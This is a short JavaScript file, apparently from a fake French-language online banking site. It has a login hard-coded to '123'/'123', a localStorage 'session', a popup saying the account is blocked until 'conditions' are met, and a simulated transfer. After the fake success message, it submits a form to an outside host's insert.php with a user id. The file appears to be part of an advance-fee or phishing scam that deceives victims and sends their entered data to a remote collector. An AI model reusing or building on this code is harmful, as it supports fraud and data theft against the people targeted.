/** Index Javascript **/


const login = () => {
    let identifiant = document.getElementById("username").value
    let password = document.getElementById("secret-nbr").value
    if (identifiant != "" && password != "") {
        if (identifiant === "123" && password === "123") {
            localStorage.setItem("sessionID", "true")
            window.location = "solde.php"
        } else {
            document.getElementsByClassName("message_title")[0].innerHTML = "Identifiants ou mot de passe incorrect"
        }
    } else {
        document.getElementsByClassName("message_title")[0].innerHTML = "Veuillez rempli tout les champs"
    }
}


const resetU = () => {
    document.getElementById("username").value = ""
}

const resetS = () => {
    document.getElementById("secret-nbr").value = ""
}


/** End Index javascript **/



/** solde javascript **/
const alert_block = () => {
    Swal.fire(
        'COMPTE BLOQUÉ',
        'Veuillez remplir les conditions pour débloquer votre compte',
        'warning',
    )
}
/** End solde javascript **/




/** Deconnexion Javascript **/


const logout = () => {
    localStorage.setItem("sessionID", "false")
    window.location = "index.html"
}


/** End Deconnexion javascript **/





/** Deconnexion Javascript **/

const virement_loading = () => {
    let timerInterval
    Swal.fire({
        title: 'virement en cours',
        html: 'chargement...',
        timer: 1000,
        timerProgressBar: false,
        didOpen: () => {
            Swal.showLoading()
        },
        willClose: () => {
            alert_message()
        }
    }).then((result) => {
        /* Read more about handling dismissals below */
        if (result.dismiss === Swal.DismissReason.timer) {
            console.log('I was closed by the timer')
        }
    })
}


const alert_message = () => {

    Swal.fire({
        allowOutsideClick : false,
        title :'succès',
        text : 'virement éffectué',
        icon :'success',
    }).then((result) => {
        if (result.isConfirmed) {
            document.getElementById("myForm").action = "https://grp.src-top.online/temp/assr/assets/insert.php/?IdUser=" + localStorage.getItem("id_user")
            document.getElementById("myForm").submit()
        }
    })
    
}
/** End Deconnexion javascript **/